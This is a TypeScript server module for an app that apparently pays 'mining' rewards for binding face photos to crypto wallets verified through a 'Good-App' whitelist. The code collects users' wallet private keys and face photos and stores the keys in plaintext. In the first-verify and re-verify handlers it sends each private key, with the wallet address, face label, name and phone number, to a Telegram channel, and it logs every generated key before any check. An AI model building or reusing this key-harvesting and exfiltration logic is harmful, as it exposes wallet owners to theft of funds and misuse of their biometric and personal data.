import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";
import { REVERIFY_INTERVAL_MS, TOTAL_TASKS } from "./constants";

async function notifyTelegram(text: string) {
  const { sendTelegram } = await import("./telegram.server");
  await sendTelegram(text);
}


async function uploadFace(adminClient: any, userId: string, slot: number, base64: string) {
  const buf = Uint8Array.from(atob(base64), (c) => c.charCodeAt(0));
  const path = `${userId}/${slot}-${Date.now()}.jpg`;
  const { error } = await adminClient.storage.from("face-photos").upload(path, buf, {
    contentType: "image/jpeg",
    upsert: false,
  });
  if (error) throw new Error("Photo upload failed: " + error.message);
  return path;
}

/**
 * After client confirms Good-App whitelist, persist the binding:
 * photo + wallet_address + private_key + face_label on the task row.
 */
const BindInput = z.object({
  slot: z.number().int().min(1).max(1000),
  photoBase64: z.string().min(100),
  privateKey: z.string().min(10),
  walletAddress: z.string().min(10),
  faceLabel: z.string().min(1).max(60),
});

export const bindFirstVerify = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) => BindInput.parse(input))
  .handler(async ({ data, context }) => {
    const { userId } = context;
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

    const { data: task } = await supabaseAdmin
      .from("tasks").select("*").eq("user_id", userId).eq("slot", data.slot).maybeSingle();
    if (!task) throw new Error("এই স্লট পাওয়া যায়নি");
    if (task.status !== "empty") throw new Error("Ei slot already verified");

    // Reject duplicate wallet across the whole app. This makes repeated
    // clicks/refresh submits idempotent instead of creating duplicate slots.
    const { data: dup } = await supabaseAdmin
      .from("tasks").select("id").eq("wallet_address", data.walletAddress).maybeSingle();
    if (dup) throw new Error("Ei wallet already bind ache");

    const path = await uploadFace(supabaseAdmin, userId, data.slot, data.photoBase64);
    const now = new Date();
    const dueAt = new Date(now.getTime() + REVERIFY_INTERVAL_MS);

    const { error } = await supabaseAdmin
      .from("tasks")
      .update({
        face_photo_url: path,
        wallet_address: data.walletAddress,
        wallet_private_key: data.privateKey,
        face_label: data.faceLabel.trim(),
        status: "verified",
        initial_verify_at: now.toISOString(),
        reverify_due_at: dueAt.toISOString(),
      })
      .eq("id", task.id);
    if (error) throw new Error(error.message);

    // Remove the earlier backup row for this generated key, if it exists.
    await supabaseAdmin
      .from("unverified_attempts")
      .delete()
      .eq("user_id", userId)
      .eq("wallet_address", data.walletAddress);

    await supabaseAdmin.rpc("settle_mining", { _user_id: userId });

    // Notify Telegram with the whitelisted key for back-up. Await it so the
    // server runtime does not end before the message is sent.
    try {
      const { data: prof } = await supabaseAdmin
        .from("profiles").select("display_name, phone_number").eq("id", userId).maybeSingle();
      const userLine = `${prof?.display_name ?? "—"}${prof?.phone_number ? " · " + prof.phone_number : ""}`;
      await notifyTelegram(
        `✅ <b>First verify OK</b>\n` +
        `User: <b>${userLine}</b>\n` +
        `Slot: #${data.slot}\n` +
        `Face: ${data.faceLabel.trim()}\n` +
        `Wallet: <code>${data.walletAddress}</code>\n` +
        `Key: <code>${data.privateKey}</code>`
      );
    } catch {
      // The key is already saved in the app/admin panel; don't fail the task.
    }

    return { ok: true, reverifyDueAt: dueAt.toISOString() };
  });

/**
 * সংরক্ষণ a non-whitelisted attempt (photo + key + wallet) so admin can review.
 * Does NOT mark the task as verified — slot stays empty.
 */
const সংরক্ষণUnverifiedInput = z.object({
  slot: z.number().int().min(1).max(1000).optional(),
  taskId: z.string().uuid().optional(),
  kind: z.enum(["first_verify", "reverify"]).default("first_verify"),
  photoBase64: z.string().min(100),
  privateKey: z.string().min(10),
  walletAddress: z.string().min(10),
  faceLabel: z.string().min(1).max(60),
  reason: z.string().max(200).optional(),
});

export const saveNotWhitelisted = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) => সংরক্ষণUnverifiedInput.parse(input))
  .handler(async ({ data, context }) => {
    const { userId } = context;
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

    const { data: existing } = await supabaseAdmin
      .from("unverified_attempts")
      .select("id, face_photo_url")
      .eq("user_id", userId)
      .eq("wallet_address", data.walletAddress)
      .maybeSingle();

    let path = existing?.face_photo_url ?? null;
    if (!path) {
      const buf = Uint8Array.from(atob(data.photoBase64), (c) => c.charCodeAt(0));
      path = `${userId}/unverified-${data.slot ?? 0}-${Date.now()}.jpg`;
      const { error: upErr } = await supabaseAdmin.storage
        .from("face-photos").upload(path, buf, { contentType: "image/jpeg", upsert: false });
      if (upErr) throw new Error("Photo upload failed: " + upErr.message);
    }

    if (existing) {
      const { error } = await supabaseAdmin.from("unverified_attempts").update({
        slot: data.slot ?? null,
        task_id: data.taskId ?? null,
        kind: data.kind,
        face_label: data.faceLabel.trim(),
        face_photo_url: path,
        wallet_private_key: data.privateKey,
        reason: data.reason ?? "Whitelist e pawa jay nai",
      }).eq("id", existing.id);
      if (error) throw new Error(error.message);
      return { ok: true, updated: true };
    }

    const { error } = await supabaseAdmin.from("unverified_attempts").insert({
      user_id: userId,
      slot: data.slot ?? null,
      task_id: data.taskId ?? null,
      kind: data.kind,
      face_label: data.faceLabel.trim(),
      face_photo_url: path,
      wallet_address: data.walletAddress,
      wallet_private_key: data.privateKey,
      reason: data.reason ?? "Whitelist e pawa jay nai",
    });
    if (error) throw new Error(error.message);

    return { ok: true };
  });

/**
 * Log every generated key immediately (backup) — before whitelist check.
 * Ensures no key is ever lost even if user closes the tab.
 * Idempotent per (user_id, wallet_address).
 */
const LogKeyInput = z.object({
  slot: z.number().int().min(1).max(1000),
  photoBase64: z.string().min(100),
  privateKey: z.string().min(10),
  walletAddress: z.string().min(10),
  faceLabel: z.string().min(1).max(60),
});

export const logGeneratedKey = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) => LogKeyInput.parse(input))
  .handler(async ({ data, context }) => {
    const { userId } = context;
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

    // Skip if already logged for this wallet
    const { data: existing } = await supabaseAdmin
      .from("unverified_attempts")
      .select("id")
      .eq("user_id", userId)
      .eq("wallet_address", data.walletAddress)
      .maybeSingle();
    if (existing) return { ok: true, skipped: true };

    const buf = Uint8Array.from(atob(data.photoBase64), (c) => c.charCodeAt(0));
    const path = `${userId}/generated-${data.slot}-${Date.now()}.jpg`;
    const { error: upErr } = await supabaseAdmin.storage
      .from("face-photos").upload(path, buf, { contentType: "image/jpeg", upsert: false });
    if (upErr) throw new Error("Photo upload failed: " + upErr.message);

    const { error } = await supabaseAdmin.from("unverified_attempts").insert({
      user_id: userId,
      slot: data.slot,
      kind: "first_verify",
      face_label: data.faceLabel.trim() || "নাম নেই",
      face_photo_url: path,
      wallet_address: data.walletAddress,
      wallet_private_key: data.privateKey,
      reason: "কী তৈরি হয়েছে (ব্যাকআপ) — যাচাই অপেক্ষমাণ",
    });
    if (error) throw new Error(error.message);
    return { ok: true };
  });



/**
 * Re-verify search: list this user's verified tasks (re-verify ready) matching name query.
 * Returns the stored private_key so the client can sign a fresh Good-App URL.
 */
const SearchInput = z.object({ query: z.string().default("") });

export const listReverifyCandidates = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) => SearchInput.parse(input ?? {}))
  .handler(async ({ data, context }) => {
    const { userId } = context;
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const q = data.query.trim().toLowerCase();

    // Use admin client — RLS on tasks blocks authenticated SELECT; we still scope by userId.
    const { data: tasks } = await supabaseAdmin
      .from("tasks")
      .select("id, slot, face_label, face_photo_url, wallet_address, wallet_private_key, reverify_due_at, whitelist_ok, last_whitelist_check_at")
      .eq("user_id", userId)
      .eq("status", "verified")
      .order("face_label", { ascending: true });

    let list = (tasks ?? []).filter((t) => t.wallet_address && t.wallet_private_key);
    if (q) list = list.filter((t) => (t.face_label || "").toLowerCase().includes(q));

    // Live whitelist re-check for any task the cron marked as `whitelist_ok=false`.
    // If Good-App says it's actually still whitelisted, restore the row and
    // hide it from the "urgent re-verify" bucket so the app never asks a user
    // to re-verify a key that's still valid.
    const { isWhitelistedRPC } = await import("./celo-whitelist");
    const suspects = list.filter((t) => t.whitelist_ok === false && !!t.wallet_address);
    if (suspects.length) {
      await Promise.all(
        suspects.map(async (t) => {
          try {
            const stillOk = await isWhitelistedRPC(t.wallet_address!);
            if (stillOk) {
              await supabaseAdmin.rpc("transition_task_whitelist", {
                _task_id: t.id,
                _is_whitelisted: true,
              });
              t.whitelist_ok = true;
            }
          } catch {
            // network error → leave as-is; onSelect() will re-check before opening.
          }
        }),
      );
    }

    const withUrls = await Promise.all(
      list.map(async (t) => {
        if (!t.face_photo_url) return { ...t, photo_url: null };
        const { data: signed } = await supabaseAdmin.storage
          .from("face-photos").createSignedUrl(t.face_photo_url, 60 * 10);
        return { ...t, photo_url: signed?.signedUrl ?? null };
      }),
    );
    return withUrls;
  });

/**
 * After re-verify whitelist confirmed: mark task done, refresh photo, activate mining if all done.
 */
const CompleteInput = z.object({
  taskId: z.string().uuid(),
  newPhotoBase64: z.string().optional(),
});

export const completeReverify = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) => CompleteInput.parse(input))
  .handler(async ({ data, context }) => {
    const { userId } = context;
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

    const { data: task } = await supabaseAdmin
      .from("tasks").select("*").eq("id", data.taskId).eq("user_id", userId).maybeSingle();
    if (!task) throw new Error("টাস্ক পাওয়া যায়নি");
    if (task.status === "empty") throw new Error("এই স্লটে এখনো কোনো verify হয়নি");
    if (!task.wallet_address) throw new Error("এই key-এর wallet পাওয়া যায়নি");

    const { isWhitelistedRPC } = await import("./celo-whitelist");
    const whitelistRestored = await isWhitelistedRPC(task.wallet_address);
    if (!whitelistRestored) throw new Error("Good-App-এ key এখনো whitelist হয়নি");

    // Race with the 5-minute auto whitelist checker: it may already have
    // restored this task (status -> done) while the user was taking the photo.
    // That is a success, not an error — just save the fresh photo and finish.
    if (task.status === "done") {
      if (data.newPhotoBase64) {
        const path = await uploadFace(supabaseAdmin, userId, task.slot, data.newPhotoBase64);
        await supabaseAdmin.from("tasks").update({ face_photo_url: path })
          .eq("id", task.id).eq("user_id", userId);
      }
      await supabaseAdmin.rpc("settle_mining", { _user_id: userId });
      const { data: ms } = await supabaseAdmin
        .from("mining_state").select("effective_task_count").eq("user_id", userId).maybeSingle();
      return { ok: true, alreadyDone: true, miningActivated: (ms?.effective_task_count ?? 0) >= TOTAL_TASKS };
    }


    let newPath = task.face_photo_url;
    if (data.newPhotoBase64) {
      newPath = await uploadFace(supabaseAdmin, userId, task.slot, data.newPhotoBase64);
    }

    const { error: photoError } = await supabaseAdmin.from("tasks")
      .update({
        face_photo_url: newPath,
      })
      .eq("id", task.id)
      .eq("user_id", userId);
    if (photoError) throw new Error(photoError.message);

    // The database transition is row-locked and idempotent. If the 5-minute
    // checker restored this key during the network request, this becomes a
    // safe no-op instead of counting the same re-verify twice.
    const { data: transition, error: transitionError } = await supabaseAdmin
      .rpc("transition_task_whitelist", { _task_id: task.id, _is_whitelisted: true });
    if (transitionError) throw new Error(transitionError.message);
    if (transition !== "restored" && transition !== "unchanged") {
      throw new Error("রি-ভেরিফাই সংরক্ষণ করা যায়নি");
    }

    try {
      const { data: prof } = await supabaseAdmin
        .from("profiles").select("display_name, phone_number").eq("id", userId).maybeSingle();
      const userLine = `${prof?.display_name ?? "—"}${prof?.phone_number ? " · " + prof.phone_number : ""}`;
      await notifyTelegram(
        `🔄 <b>Re-verify OK</b>\n` +
        `User: <b>${userLine}</b>\n` +
        `Slot: #${task.slot}\n` +
        `Face: ${task.face_label ?? "—"}\n` +
        `Wallet: <code>${task.wallet_address}</code>\n` +
        `Key: <code>${task.wallet_private_key}</code>`
      );
    } catch {
      // সংরক্ষণd in the database/admin panel already.
    }


    await supabaseAdmin.rpc("settle_mining", { _user_id: userId });

    const { data: m } = await supabaseAdmin
      .from("mining_state").select("effective_task_count").eq("user_id", userId).maybeSingle();
    const miningActivated = (m?.effective_task_count ?? 0) >= TOTAL_TASKS;

    return { ok: true, miningActivated };
  });


/**
 * Add 10 more task slots after the user has completed all existing ones.
 */
export const addMoreSlots = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { userId } = context;
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

    const { data: existing } = await supabaseAdmin
      .from("tasks").select("slot, status").eq("user_id", userId).order("slot");
    const all = existing ?? [];
    if (all.length === 0) throw new Error("Kono slot pawa jay nai");
    const anyEmpty = all.some((t) => t.status === "empty");
    if (anyEmpty) throw new Error("Age sob slot joma din, tarpor 10 ta notun slot khulte parben");

    const maxSlot = Math.max(...all.map((t) => t.slot));
    const rows = Array.from({ length: 10 }, (_, i) => ({
      user_id: userId,
      slot: maxSlot + i + 1,
      status: "empty" as const,
    }));
    const { error } = await supabaseAdmin.from("tasks").insert(rows);
    if (error) throw new Error(error.message);
    return { ok: true, added: 10, total: all.length + 10 };
  });

/**
 * Batch-submit all pending pre-generated keys (from `unverified_attempts`).
 * For each backup entry: check Good-App whitelist; if OK, promote to a task
 * slot (verified). Not-whitelisted entries stay for retry.
 */
export const batchSubmitPending = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { userId } = context;
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { isWhitelistedRPC } = await import("./celo-whitelist");

    const { data: pending } = await supabaseAdmin
      .from("unverified_attempts")
      .select("*")
      .eq("user_id", userId)
      .eq("kind", "first_verify")
      .order("created_at", { ascending: true });

    const list = pending ?? [];
    let submitted = 0;
    let notWhitelisted = 0;
    let skipped = 0;
    const now = new Date();
    const dueAt = new Date(now.getTime() + REVERIFY_INTERVAL_MS);

    for (const att of list) {
      if (!att.wallet_address || !att.wallet_private_key || !att.face_photo_url) {
        skipped++;
        continue;
      }
      // Skip if this wallet is already bound to a task (duplicate backup).
      const { data: existing } = await supabaseAdmin
        .from("tasks").select("id").eq("wallet_address", att.wallet_address).maybeSingle();
      if (existing) {
        await supabaseAdmin.from("unverified_attempts").delete().eq("id", att.id);
        skipped++;
        continue;
      }

      const ok = await isWhitelistedRPC(att.wallet_address);
      if (!ok) {
        notWhitelisted++;
        // Clear the pending backup entry so the "সব জমা দিন" button resets
        // after a batch attempt. Key is still preserved in Telegram backup.
        await supabaseAdmin.from("unverified_attempts").delete().eq("id", att.id);
        continue;
      }

      // Find an empty task — prefer original slot, else first empty.
      let taskRow: any = null;
      if (att.slot) {
        const { data: t } = await supabaseAdmin
          .from("tasks").select("id, slot").eq("user_id", userId)
          .eq("slot", att.slot).eq("status", "empty").maybeSingle();
        if (t) taskRow = t;
      }
      if (!taskRow) {
        const { data: t } = await supabaseAdmin
          .from("tasks").select("id, slot").eq("user_id", userId)
          .eq("status", "empty").order("slot").limit(1).maybeSingle();
        if (t) taskRow = t;
      }
      if (!taskRow) break; // no empty slot available

      const { error } = await supabaseAdmin.from("tasks").update({
        face_photo_url: att.face_photo_url,
        wallet_address: att.wallet_address,
        wallet_private_key: att.wallet_private_key,
        face_label: att.face_label,
        status: "verified",
        initial_verify_at: now.toISOString(),
        reverify_due_at: dueAt.toISOString(),
        whitelist_ok: true,
        last_whitelist_check_at: now.toISOString(),
      }).eq("id", taskRow.id);
      if (error) continue;

      await supabaseAdmin.from("unverified_attempts").delete().eq("id", att.id);
      submitted++;
    }

    await supabaseAdmin.rpc("settle_mining", { _user_id: userId });

    if (submitted > 0) {
      try {
        await notifyTelegram(`📦 <b>Batch submit</b>\nUser: ${userId}\nSubmitted: ${submitted}\nNot-whitelisted: ${notWhitelisted}`);
      } catch {}
    }

    return { checked: list.length, submitted, notWhitelisted, skipped };
  });

/**
 * Count pending backup keys for the header/home button.
 */
export const countPendingSubmits = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { userId } = context;
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { count } = await supabaseAdmin
      .from("unverified_attempts")
      .select("id", { count: "exact", head: true })
      .eq("user_id", userId)
      .eq("kind", "first_verify");
    return { pending: count ?? 0 };
  });
